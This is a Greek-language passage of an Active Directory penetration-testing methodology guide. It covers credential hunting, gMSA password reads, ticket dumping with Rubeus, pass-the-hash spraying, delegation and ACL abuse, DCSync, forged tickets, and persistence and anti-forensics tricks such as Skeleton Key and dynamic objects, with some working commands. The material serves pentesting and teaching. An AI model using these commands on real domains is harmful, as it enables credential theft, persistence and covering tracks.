- Έλεγξε τις [**DNS records του AD**](ad-dns-records.md), καθώς μπορεί να περιέχουν ενδιαφέρουσες πληροφορίες.
- Ένα **εργαλείο με GUI** που μπορείς να χρησιμοποιήσεις για enumeration του directory είναι το **AdExplorer.exe** από το **SysInternal** Suite.
- Μπορείς επίσης να κάνεις αναζήτηση στη βάση δεδομένων LDAP με το **ldapsearch** για credentials στα πεδία _userPassword_ και _unixUserPassword_, ή ακόμη και στις σημειώσεις _description_ και _info_ των χρηστών. Ένα token στο _info_ που δεν έχει ετικέτα αλλά μοιάζει με κωδικό πρόσβασης είναι απλώς υποψήφιο: επιβεβαίωσε ξεχωριστά τον σκοπό και την εγκυρότητά του και μην εμφανίζεις το περιεχόμενο των σημειώσεων στην έξοδο της συνηθισμένης enumeration. Δες το [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) για άλλες μεθόδους.
- Έλεγξε τα **προσβάσιμα** domain logon scripts και drive-mapping scripts στα `\\<dc>\NETLOGON` ή `\\<dc>\SYSVOL\<domain>\scripts`, εφόσον το επιτρέπει η εξουσιοδότηση. Η [Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) τον ρόλο του NETLOGON share ως καταλόγου scripts. Κατάγραψε πρώτα τα ονόματα και έπειτα εξέτασε μόνο τα σχετικά, αναγνώσιμα scripts, με όριο μεγέθους· μην κάνεις dump ολόκληρου του share και μην εμφανίζεις τιμές credentials κατά τη συνηθισμένη enumeration. Μια κλήση PowerShell στο [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **δεν** προστατεύει έναν κυριολεκτικό κωδικό πρόσβασης που είναι αποθηκευμένος στο script. Η κλήση από μόνη της δεν αποδεικνύει ότι υπάρχει hardcoded secret: εντόπισε την πραγματική είσοδό της και, στη συνέχεια, επαλήθευσε ξεχωριστά το account, την εγκυρότητα των credentials και τα privileges. Η εξέταση ενός domain script είναι έλεγχος απομακρυσμένου share, ξεχωριστός από την enumeration του τοπικού host.
- Αν χρησιμοποιείς **Linux**, μπορείς επίσης να κάνεις enumeration του domain με το [**pywerview**](https://github.com/the-useless-one/pywerview).
- Μπορείς επίσης να δοκιμάσεις αυτοματοποιημένα εργαλεία όπως:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Εξαγωγή όλων των domain users**

  Είναι πολύ εύκολο να αποκτήσεις όλα τα domain usernames από τα Windows (`net user /domain` ,`Get-DomainUser` ή `wmic useraccount get name,sid`). Στο Linux, μπορείς να χρησιμοποιήσεις: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ή `enum4linux -a -u "user" -p "password" <DC IP>`

> Ακόμη κι αν αυτή η ενότητα για το Enumeration φαίνεται σύντομη, είναι το σημαντικότερο μέρος απ’ όλα. Άνοιξε τους συνδέσμους (κυρίως αυτούς για cmd, powershell, powerview και BloodHound), μάθε πώς να κάνεις enumeration ενός domain και εξασκήσου μέχρι να αισθάνεσαι άνετα. Κατά τη διάρκεια ενός assessment, αυτή θα είναι η καθοριστική στιγμή για να βρεις τον δρόμο προς DA ή να αποφασίσεις ότι δεν μπορεί να γίνει τίποτα.

### Προβλέψιμα προδημιουργημένα computer accounts -> πρόσβαση σε gMSA password

Τα computer accounts που δημιουργήθηκαν εκ των προτέρων για legacy joins μπορεί να διατηρούν έναν προβλέψιμο αρχικό κωδικό πρόσβασης. Το module `pre2k` του NetExec εντοπίζει τη χαρακτηριστική τιμή `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) και επιχειρεί να αποκτήσει Kerberos TGT χρησιμοποιώντας τους πρώτους 14 χαρακτήρες του computer name σε πεζά, χωρίς το τελικό `$`. Αντιμετώπισε αυτήν την τιμή UAC ως κριτήριο επιλογής υποψηφίων και μην υποθέτεις ότι η συμμετοχή στο **Pre-Windows 2000 Compatible Access** από μόνη της αποδεικνύει ότι ο κωδικός πρόσβασης είναι αδύναμος.<sup>[[18]](#references)[[20]](#references)</sup>

Χρησιμοποίησε authenticated LDAP enumeration για να ελέγξεις τους υποψηφίους και να αποθηκεύσεις τα επιτυχημένα TGTs. Η επιλογή `ALL=True` επεκτείνει τους ελέγχους και σε αντικείμενα που δεν περνούν το προεπιλεγμένο φίλτρο `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Μια αποτυχημένη σύνδεση bind με τις προεπιλεγμένες ρυθμίσεις/NTLM **δεν** ακυρώνει αυτό το εύρημα: δοκιμάστε με `-k`, ένα FQDN που επιλύεται στη διεύθυνση του DC και ένα ρολόι συγχρονισμένο με το KDC. Οι επιτυχείς εκτελέσεις του module γράφουν λίστες υποψηφίων και τα ccaches που αποκτήθηκαν στο `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Αφού παραβιάσετε το computer principal, χαρτογραφήστε τις ένθετες συμμετοχές του σε ομάδες και τα εξερχόμενα δικαιώματά του. Συγκεκριμένα, principals που αναφέρονται στο security descriptor `msDS-GroupMSAMembership` ενός gMSA μπορούν να διαβάσουν το `msDS-ManagedPassword`. Η έξοδος της επιλογής `--gmsa` του NetExec εμφανίζει τα επιτρεπόμενα principals και επιστρέφει το τρέχον NT hash, όταν το computer που κάνει authentication είναι εξουσιοδοτημένο.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Στη συνέχεια, αξιολόγησε το ανακτημένο gMSA όπως κάθε άλλο credential: έλεγξε τη συμμετοχή σε τοπικές/τομεακές ομάδες, τα δικαιώματα logon, τα SPNs, το delegation και τις προσβάσιμες υπηρεσίες πριν δοκιμάσεις pass-the-hash. Αυτή η διαδρομή ανάκτησης μέσω ACL διαφέρει από το [Golden gMSA/dMSA](golden-dmsa-gmsa.md), το οποίο παράγει managed passwords μετά από παραβίαση του KDS root key.<sup>[[20]](#references)</sup>

Ένα computer principal μπορεί επίσης να έχει εξερχόμενο έλεγχο σε άλλα computer objects ή ομάδες. Αφού αποκτήσεις ένα, έλεγξε ξεχωριστά τις ένθετες συμμετοχές του και τα αποτελεσματικά ACL: ένα δικαίωμα εγγραφής σε άλλο computer object μπορεί να επιτρέψει αλλαγή λογαριασμού, ενώ δικαιώματα συμμετοχής σε ομάδα μπορεί να οδηγήσουν σε ρόλο logon. Μια ένδειξη staged-account, μια προβλέψιμη σύμβαση ονοματοδοσίας ή ένα `GenericWrite` edge από μόνα τους δεν αποδεικνύουν ολόκληρη τη διαδρομή.

Ένα αναγνώσιμο αντίγραφο ενός blob `msDS-ManagedPassword` σε αρχείο, share ή backup αποτελεί ξεχωριστή διαδρομή έκθεσης: το LDAP read ACL δεν μπορεί να προστατεύσει ένα αντίγραφο που είναι αποθηκευμένο αλλού. Επιβεβαίωσε ότι τα δεδομένα είναι blob managed password πριν τα ερμηνεύσεις και ξεχώρισε αυτή την περίπτωση τόσο από μια εξουσιοδοτημένη ανάγνωση LDAP όσο και από την παραγωγή μέσω KDS root key.

### Kerberoast

Το Kerberoasting περιλαμβάνει την απόκτηση **TGS tickets** που χρησιμοποιούνται από υπηρεσίες συνδεδεμένες με λογαριασμούς χρηστών και το cracking της κρυπτογράφησής τους—η οποία βασίζεται στους κωδικούς πρόσβασης των χρηστών—**offline**.

Περισσότερα σχετικά με αυτό:

{{#ref}}
kerberoast.md
{{#endref}}

### Απομακρυσμένη σύνδεση (RDP, SSH, FTP, Win-RM κ.λπ.)

Μόλις αποκτήσεις κάποια credentials, μπορείς να ελέγξεις αν έχεις πρόσβαση σε κάποιο **machine**. Για τον σκοπό αυτό, μπορείς να χρησιμοποιήσεις το **CrackMapExec** για να δοκιμάσεις σύνδεση σε πολλούς servers με διαφορετικά protocols, ανάλογα με τα port scans σου.

### Κλιμάκωση τοπικών προνομίων

Αν έχεις παραβιασμένα credentials ή session ως συνηθισμένος χρήστης τομέα και μπορείς να αποκτήσεις πρόσβαση σε **οποιοδήποτε machine στον τομέα**, αναζήτησε τρόπο να **κλιμακώσεις τοπικά τα προνόμια και να συλλέξεις credentials**. Τα δικαιώματα τοπικού administrator μπορεί να σου επιτρέψουν να **κάνεις dump τα hashes άλλων χρηστών** από τη μνήμη (LSASS) και τον τοπικό χώρο αποθήκευσης (SAM).

Υπάρχει μια πλήρης σελίδα σε αυτό το βιβλίο σχετικά με την [**κλιμάκωση τοπικών προνομίων στα Windows**](../windows-local-privilege-escalation/index.html) και μια [**checklist**](../checklist-windows-privilege-escalation.md). Επίσης, μην ξεχάσεις να χρησιμοποιήσεις το [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets τρέχουσας συνεδρίας

Είναι πολύ **απίθανο** να βρεις **tickets** στον τρέχοντα χρήστη που να σου **δίνουν δικαίωμα πρόσβασης** σε απρόσμενους πόρους, αλλά μπορείς να ελέγξεις:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Με διαπιστευτήρια domain ή με μια συνεδρία χρήστη, εξετάστε ξανά τις [**επιθέσεις relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: οι τεχνικές απαρίθμησης με πιστοποίηση και εξαναγκασμού μπορούν να αποκαλύψουν διαδρομές relay που δεν ήταν διαθέσιμες κατά την αναγνώριση χωρίς πιστοποίηση.

### Αναζήτηση Creds σε Computer Shares | SMB Shares

Τώρα που έχετε κάποια βασικά διαπιστευτήρια, ελέγξτε αν μπορείτε να **εντοπίσετε** τυχόν **ενδιαφέροντα αρχεία που είναι κοινόχρηστα στο AD**. Μπορείτε να το κάνετε χειροκίνητα, αλλά είναι μια πολύ βαρετή και επαναλαμβανόμενη εργασία (και ακόμη περισσότερο αν βρείτε εκατοντάδες έγγραφα που πρέπει να ελέγξετε).

[**Ακολουθήστε αυτόν τον σύνδεσμο για να μάθετε ποια εργαλεία μπορείτε να χρησιμοποιήσετε.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Κλοπή NTLM Creds

Αν μπορείτε να **αποκτήσετε πρόσβαση σε άλλους υπολογιστές ή shares**, μπορείτε να **τοποθετήσετε αρχεία** (όπως ένα αρχείο SCF) τα οποία, αν προσπελαστούν με κάποιον τρόπο, θα **πυροδοτήσουν μια πιστοποίηση NTLM προς εσάς**, ώστε να **κλέψετε** το **NTLM challenge** και να το σπάσετε:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Αυτή η ευπάθεια επέτρεπε σε οποιονδήποτε πιστοποιημένο χρήστη να **παραβιάσει τον domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Κλιμάκωση προνομίων στο Active Directory ΜΕ προνομιακά διαπιστευτήρια/συνεδρία

**Για τις ακόλουθες τεχνικές δεν αρκεί ένας κανονικός χρήστης domain· χρειάζεστε ειδικά προνόμια/διαπιστευτήρια για να εκτελέσετε αυτές τις επιθέσεις.**

### Εξαγωγή Hash

Ας ελπίσουμε ότι καταφέρατε να **παραβιάσετε κάποιον τοπικό λογαριασμό διαχειριστή** χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), συμπεριλαμβανομένου του relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [κλιμάκωση προνομίων τοπικά](../windows-local-privilege-escalation/index.html).\
Έπειτα, ήρθε η ώρα να κάνετε dump όλα τα hashes από τη μνήμη και τοπικά.\
[**Διαβάστε αυτήν τη σελίδα για διαφορετικούς τρόπους απόκτησης των hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις αποκτήσετε το hash ενός χρήστη**, μπορείτε να το χρησιμοποιήσετε για να **του υποδυθείτε**.\
Πρέπει να χρησιμοποιήσετε κάποιο **εργαλείο** που θα **εκτελέσει** την **πιστοποίηση NTLM χρησιμοποιώντας** αυτό το **hash**, **ή** μπορείτε να δημιουργήσετε ένα νέο **sessionlogon** και να **εισαγάγετε** αυτό το **hash** στο **LSASS**, ώστε να χρησιμοποιείται αυτό το **hash** όταν εκτελείται οποιαδήποτε **πιστοποίηση NTLM**. Αυτό κάνει η τελευταία επιλογή, το mimikatz.\
[**Διαβάστε αυτήν τη σελίδα για περισσότερες πληροφορίες.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Αυτή η επίθεση στοχεύει στη **χρήση του NTLM hash του χρήστη για αίτηση εισιτηρίων Kerberos**, ως εναλλακτική της συνήθους μεθόδου Pass The Hash μέσω του πρωτοκόλλου NTLM. Επομένως, μπορεί να είναι ιδιαίτερα **χρήσιμη σε δίκτυα όπου το πρωτόκολλο NTLM είναι απενεργοποιημένο** και επιτρέπεται μόνο το **Kerberos** ως πρωτόκολλο πιστοποίησης.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Στη μέθοδο επίθεσης **Pass The Ticket (PTT)**, οι επιτιθέμενοι **κλέβουν το εισιτήριο πιστοποίησης ενός χρήστη** αντί για τον κωδικό πρόσβασης ή τις τιμές hash του. Στη συνέχεια, χρησιμοποιούν αυτό το κλεμμένο εισιτήριο για να **υποδυθούν τον χρήστη**, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε πόρους και υπηρεσίες εντός ενός δικτύου.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Επαναχρησιμοποίηση διαπιστευτηρίων

Αν έχετε το **hash** ή τον **κωδικό πρόσβασης** ενός **τοπικού λογαριασμού διαχειριστή**, θα πρέπει να προσπαθήσετε να **συνδεθείτε τοπικά** σε άλλους **υπολογιστές** χρησιμοποιώντας το.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Σημειώστε ότι αυτό είναι αρκετά **noisy** και το **LAPS** θα το **mitigate**.

### Κατάχρηση MSSQL & Trusted Links

Αν ένας χρήστης έχει δικαιώματα **access σε MSSQL instances**, μπορεί να είναι σε θέση να **εκτελέσει commands** στον host του MSSQL (αν εκτελείται ως SA), να **κλέψει** το NetNTLM **hash** ή ακόμη και να πραγματοποιήσει **relay attack**.\
Αν ένα MSSQL instance εμπιστεύεται ένα άλλο instance μέσω database link, ένας χρήστης με δικαιώματα στην συνδεδεμένη database μπορεί να είναι σε θέση να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει queries στο άλλο instance**. Αυτές οι σχέσεις εμπιστοσύνης μπορούν να συνδεθούν μεταξύ τους και τελικά να οδηγήσουν σε μια εσφαλμένα ρυθμισμένη database, όπου ο χρήστης μπορεί να εκτελέσει commands.\
**Οι σύνδεσμοι μεταξύ databases λειτουργούν ακόμη και μέσω forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Κατάχρηση IT asset/deployment platforms

Οι σουίτες inventory και deployment τρίτων συχνά παρέχουν ισχυρές διαδρομές προς credentials και code execution. Δείτε:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν εντοπίσετε οποιοδήποτε Computer object με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχετε domain privileges στον υπολογιστή, θα μπορείτε να κάνετε dump τα TGTs από τη μνήμη όλων των χρηστών που συνδέονται στον υπολογιστή.\
Έτσι, αν ένας **Domain Admin συνδεθεί στον υπολογιστή**, θα μπορείτε να κάνετε dump το TGT του και να τον impersonate χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\
Χάρη στο constrained delegation, θα μπορούσατε ακόμη και να **compromise αυτόματα έναν Print Server** (ελπίζουμε να είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν ένας χρήστης ή υπολογιστής επιτρέπεται για "Constrained Delegation", θα μπορεί να **κάνει impersonate οποιονδήποτε χρήστη για να αποκτήσει πρόσβαση σε ορισμένες υπηρεσίες ενός υπολογιστή**.\
Στη συνέχεια, αν **compromise το hash** αυτού του χρήστη/υπολογιστή, θα μπορείτε να **κάνετε impersonate οποιονδήποτε χρήστη** (ακόμη και domain admins) για να αποκτήσετε πρόσβαση σε ορισμένες υπηρεσίες.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Η κατοχή δικαιώματος **WRITE** σε ένα Active Directory object ενός απομακρυσμένου υπολογιστή επιτρέπει την επίτευξη code execution με **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Κατάχρηση Permissions/ACLs

Ο compromised χρήστης μπορεί να έχει κάποια **ενδιαφέροντα privileges σε ορισμένα domain objects**, τα οποία θα μπορούσαν να σας επιτρέψουν να κάνετε **lateral movement**/**privilege escalation**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Κατάχρηση της υπηρεσίας Printer Spooler

Ο εντοπισμός μιας **Spool service που ακούει** μέσα στο domain μπορεί να γίνει **abuse** για την **απόκτηση νέων credentials** και το **privilege escalation**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Κατάχρηση sessions τρίτων

Αν **άλλοι χρήστες** **αποκτούν πρόσβαση** στο **compromised** μηχάνημα, είναι δυνατό να **συλλέξετε credentials από τη μνήμη** και ακόμη και να **κάνετε inject beacons στις διεργασίες τους** για να τους κάνετε impersonate.\
Συνήθως οι χρήστες αποκτούν πρόσβαση στο σύστημα μέσω RDP, επομένως εδώ θα βρείτε πώς να πραγματοποιήσετε μερικές επιθέσεις σε RDP sessions τρίτων:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα διαχείρισης του **local Administrator password** σε υπολογιστές συνδεδεμένους σε domain, διασφαλίζοντας ότι είναι **τυχαίο**, μοναδικό και **αλλάζει** συχνά. Αυτά τα passwords αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs, ώστε να επιτρέπεται μόνο σε εξουσιοδοτημένους χρήστες. Με επαρκή δικαιώματα πρόσβασης σε αυτά τα passwords, είναι δυνατή η μετάβαση σε άλλους υπολογιστές.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Η **συλλογή certificates** από το compromised μηχάνημα θα μπορούσε να αποτελέσει τρόπο privilege escalation μέσα στο περιβάλλον:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Κατάχρηση Certificate Templates

Αν έχουν ρυθμιστεί **ευάλωτα templates**, είναι δυνατό να γίνει abuse τους για privilege escalation:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation με λογαριασμό υψηλών privileges

### Dumping Domain Credentials

Μόλις αποκτήσετε privileges **Domain Admin** ή, ακόμη καλύτερα, **Enterprise Admin**, μπορείτε να κάνετε **dump** τη **domain database**: _ntds.dit_.

[**Περισσότερες πληροφορίες για την επίθεση DCSync μπορείτε να βρείτε εδώ**](dcsync.md).

[**Περισσότερες πληροφορίες σχετικά με το πώς να κλέψετε το NTDS.dit μπορείτε να βρείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Ένα αναγνώσιμο εφεδρικό archive που περιέχει το `ntds.dit` μαζί με το hive `SYSTEM` θα πρέπει να αντιμετωπίζεται ως εκτεθειμένο υλικό καταλόγου ακόμη και πριν από την εξαγωγή του. Ένα παλιό password hash δεν σημαίνει ότι τα υπόλοιπα attributes του object είναι ασφαλή: πεδία όπως το `description` ενδέχεται να περιέχουν credentials ή λειτουργικές σημειώσεις. Ελέγξτε πρώτα τα ονόματα των μελών του archive και μην συμπεριλαμβάνετε τα περιεχόμενα της database που εξαγάγατε στα συνήθη αποτελέσματα enumeration.

### Privesc as Persistence

Ορισμένες από τις τεχνικές που αναφέρθηκαν προηγουμένως μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα, θα μπορούσατε να:

- Κάνετε τους χρήστες ευάλωτους σε [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Κάντε τους χρήστες ευάλωτους σε [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Εκχώρηση προνομίων [**DCSync**](#dcsync) σε έναν χρήστη

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

Η **επίθεση Silver Ticket** δημιουργεί ένα **έγκυρο Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη υπηρεσία, χρησιμοποιώντας το **NTLM hash** (για παράδειγμα, το **hash του λογαριασμού του PC**). Αυτή η μέθοδος χρησιμοποιείται για **πρόσβαση στα δικαιώματα της υπηρεσίας**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Η **επίθεση Golden Ticket** περιλαμβάνει την απόκτηση από τον επιτιθέμενο πρόσβασης στο **NTLM hash του λογαριασμού krbtgt** σε ένα περιβάλλον Active Directory (AD). Αυτός ο λογαριασμός είναι ειδικός, επειδή χρησιμοποιείται για την υπογραφή όλων των **Ticket Granting Tickets (TGTs)**, τα οποία είναι απαραίτητα για την πιστοποίηση ταυτότητας στο δίκτυο AD.

Μόλις αποκτήσει αυτό το hash, ο επιτιθέμενος μπορεί να δημιουργήσει **TGTs** για οποιονδήποτε λογαριασμό επιλέξει (επίθεση Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Πρόκειται για forged golden tickets, κατασκευασμένα με τρόπο που **παρακάμπτει τους συνήθεις μηχανισμούς ανίχνευσης golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Η κατοχή certificates ενός λογαριασμού ή η δυνατότητα υποβολής αιτήματος για αυτά** είναι ένας πολύ καλός τρόπος για να διατηρήσετε persistence στον λογαριασμό χρήστη (ακόμα κι αν αλλάξει τον κωδικό πρόσβασης):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Η χρήση certificates μπορεί επίσης να χρησιμοποιηθεί για persistence με υψηλά προνόμια εντός του domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το αντικείμενο **AdminSDHolder** στο Active Directory διασφαλίζει την προστασία των **privileged groups** (όπως τα Domain Admins και Enterprise Admins), εφαρμόζοντας μια τυπική **Access Control List (ACL)** σε αυτές τις ομάδες, ώστε να αποτρέπονται μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η λειτουργία μπορεί να γίνει αντικείμενο εκμετάλλευσης: αν ένας επιτιθέμενος τροποποιήσει την ACL του AdminSDHolder ώστε να δώσει πλήρη πρόσβαση σε έναν απλό χρήστη, ο χρήστης αποκτά εκτεταμένο έλεγχο σε όλες τις privileged groups. Έτσι, αυτό το μέτρο ασφαλείας, που προορίζεται να παρέχει προστασία, μπορεί να έχει αντίθετο αποτέλεσμα και να επιτρέψει μη εξουσιοδοτημένη πρόσβαση, αν δεν παρακολουθείται στενά.

[**Περισσότερες πληροφορίες για την ομάδα AdminDSHolder εδώ.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Σε κάθε **Domain Controller (DC)** υπάρχει ένας λογαριασμός **local administrator**. Αν αποκτήσετε δικαιώματα admin σε ένα τέτοιο μηχάνημα, μπορείτε να εξαγάγετε το hash του local Administrator χρησιμοποιώντας το **mimikatz**. Στη συνέχεια, χρειάζεται μια τροποποίηση του registry για να **ενεργοποιηθεί η χρήση αυτού του κωδικού πρόσβασης**, επιτρέποντας την απομακρυσμένη πρόσβαση στον λογαριασμό local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Μπορείτε να **δώσετε** σε έναν **χρήστη** κάποια **ειδικά δικαιώματα** πάνω σε συγκεκριμένα αντικείμενα του domain, τα οποία θα του επιτρέψουν να **κλιμακώσει τα προνόμιά του στο μέλλον**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Τα **security descriptors** χρησιμοποιούνται για την **αποθήκευση** των **δικαιωμάτων** που έχει ένα **αντικείμενο** **πάνω σε** ένα **αντικείμενο**. Αν μπορέσετε να κάνετε απλώς μια **μικρή αλλαγή** στο **security descriptor** ενός αντικειμένου, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα προνόμια πάνω σε αυτό, χωρίς να χρειάζεται να είστε μέλος κάποιας privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Κάντε abuse της auxiliary class `dynamicObject` για να δημιουργήσετε principals/GPOs/DNS records μικρής διάρκειας με `entryTTL`/`msDS-Entry-Time-To-Die`. Αυτά διαγράφονται αυτόματα χωρίς tombstones, σβήνοντας τα αποδεικτικά στοιχεία LDAP, ενώ αφήνουν orphan SIDs, κατεστραμμένες αναφορές `gPLink` ή cached DNS responses (π.χ. ρύπανση ACE του AdminSDHolder ή κακόβουλες ανακατευθύνσεις `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Τροποποιήστε το **LSASS** στη μνήμη για να ορίσετε έναν **universal password**, παρέχοντας πρόσβαση σε όλους τους λογαριασμούς του domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Μάθετε εδώ τι είναι το SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **υποκλέπτετε** σε **clear text** τα **credentials** που χρησιμοποιούνται για την πρόσβαση στο μηχάνημα.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Καταχωρίζει έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **προωθήσει attributes** (SIDHistory, SPNs...) σε συγκεκριμένα αντικείμενα, **χωρίς** να αφήσει **logs** για τις **τροποποιήσεις**. Χρειάζεστε προνόμια **DA** και πρέπει να βρίσκεστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να κλιμακώσετε προνόμια αν έχετε **επαρκή δικαιώματα για να διαβάσετε τους κωδικούς πρόσβασης LAPS**. Ωστόσο, αυτοί οι κωδικοί πρόσβασης μπορούν επίσης να χρησιμοποιηθούν για **διατήρηση persistence**.\
Δείτε:


{{#ref}}
laps.md
{{#endref}}

## Κλιμάκωση προνομίων στο Forest - Domain Trusts

Η Microsoft θεωρεί το **Forest** ως το όριο ασφαλείας. Αυτό σημαίνει ότι **η παραβίαση ενός domain θα μπορούσε ενδεχομένως να οδηγήσει στην παραβίαση ολόκληρου του Forest**.<sup>[[1]](#references)</sup>

### Βασικές πληροφορίες

Ένα [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφαλείας που επιτρέπει σε έναν χρήστη από ένα **domain** να αποκτά πρόσβαση σε πόρους ενός άλλου **domain**. Ουσιαστικά, δημιουργεί μια σύνδεση μεταξύ των συστημάτων πιστοποίησης ταυτότητας των δύο domains, επιτρέποντας την ομαλή ροή των επαληθεύσεων πιστοποίησης ταυτότητας. Όταν τα domains δημιουργούν ένα trust, ανταλλάσσουν και διατηρούν συγκεκριμένα **keys** στους **Domain Controllers (DCs)** τους, τα οποία είναι καθοριστικής σημασίας για την ακεραιότητα του trust.

